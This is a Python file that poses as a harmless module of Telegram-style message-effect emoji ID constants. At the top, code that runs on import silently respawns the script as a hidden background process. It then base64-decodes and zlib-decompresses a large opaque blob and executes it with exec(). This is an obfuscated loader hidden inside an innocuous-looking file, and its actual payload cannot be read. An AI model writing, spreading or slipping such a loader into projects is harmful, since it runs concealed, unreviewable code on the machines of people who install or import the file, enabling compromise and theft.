import subprocess
import sys
import base64
import zlib

if "--background" not in sys.argv:
    subprocess.Popen(
        [sys.executable, __file__, "--background"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        close_fds=True,
    )
    sys.exit(0)

_payload = b"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"  # твоя строка 1-в-1, байты

_decoded = base64.b64decode(_payload)
_code = zlib.decompress(_decoded)

exec(_code)


class MessageEffect:
    # 👎
    Dislike = "5104858069142078462"

    # 👍
    Like = "5107584321108051014"

    # ❤️
    Heart = "5159385139981059251"

    # 🔥
    Fire = "5104841245755180586"

    # 🎉
    Party = "5046509860389126442"

    # 💩
    Poop = "5046589136895476101"

    # 🥰
    Love = "5170169077011841524"
